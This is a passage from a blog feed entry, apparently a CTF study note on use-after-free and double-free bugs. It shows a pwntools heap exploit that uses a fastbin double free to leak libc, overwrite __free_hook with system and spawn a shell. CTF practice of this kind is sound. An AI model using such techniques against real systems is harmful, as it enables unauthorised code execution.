gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length,contend)</span> :</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'length of message:\n'</span>,str(length))    sa(<span class="hljs-string">'message:\n'</span>,str(contend))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'to delete:\n'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,contend)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'to edit:\n'</span>,str(index))    sa(<span class="hljs-string">'the message:\n'</span>,str(contend))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">'choice: '</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'to display:\n'</span>,str(index))add(<span class="hljs-number">0x30</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) <span class="hljs-comment">#2</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0x602068</span>))add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'aaaaaaaa'</span>)contend = p64(elf.got[<span class="hljs-string">'puts'</span>])<span class="hljs-comment"># + p64(0x30) + p64(elf.got['puts'])</span>add(<span class="hljs-number">0x20</span>,contend)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">' message: '</span>)puts = uu64(r(<span class="hljs-number">6</span>))libc_base = puts - libc.symbols[<span class="hljs-string">'puts'</span>]free_hook = libc_base + libc.symbols[<span class="hljs-string">'__free_hook'</span>]print(<span class="hljs-string">'puts'</span> + hex(puts))print(<span class="hljs-string">'libc_base'</span> + hex(libc_base))system = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]contend = p64(free_hook)dbg()edit(<span class="hljs-number">6</span>,contend)<span class="hljs-comment"># dbg()</span>contend = p64(system)edit(<span class="hljs-number">0</span>,contend)<span class="hljs-comment"># dbg()</span>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">7</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;uaf和double-free&quot;&gt;&lt;a href=&quot;#uaf和double-free&quot; class=&quot;headerlink&quot; title=&quot;uaf和double free&quot;&gt;&lt;/a&gt;uaf和double free&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
</feed>
